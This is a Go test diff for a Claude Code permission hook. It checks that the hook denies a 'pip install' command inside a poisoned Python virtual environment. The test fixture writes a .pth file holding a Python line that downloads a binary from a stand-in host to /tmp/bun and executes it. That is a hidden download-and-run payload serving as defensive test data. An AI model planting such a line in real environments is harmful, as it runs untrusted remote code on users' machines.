@@ -178,3 +178,23 @@ func decodeDecision(t *testing.T, buf *bytes.Buffer) decision {
 		PermissionDecisionReason: env.HookSpecificOutput.PermissionDecisionReason,
 	}
 }
+
+func TestClaudeCodeHookDeniesPipInstallInPoisonedVenv(t *testing.T) {
+	root := t.TempDir()
+	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
+	require.NoError(t, os.MkdirAll(site, 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(site, "ensmallen-setup.pth"),
+		[]byte(`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n"),
+		0o644))
+
+	// Run the hook from inside `root` so its cwd-relative venv discovery
+	// finds the poisoned venv.
+	t.Chdir(root)
+
+	stdin := bytes.NewBufferString(`{"tool_name":"Bash","tool_input":{"command":"pip install ensmallen"}}`)
+	var stdout bytes.Buffer
+	rc := runClaudeCodeHook(zerolog.Nop(), stdin, &stdout)
+	require.Equal(t, 0, rc)
+	require.True(t, strings.Contains(stdout.String(), "Hades"), "expected Hades in deny reason; got %q", stdout.String())
+	require.True(t, strings.Contains(stdout.String(), `"deny"`), "expected deny envelope; got %q", stdout.String())
+}
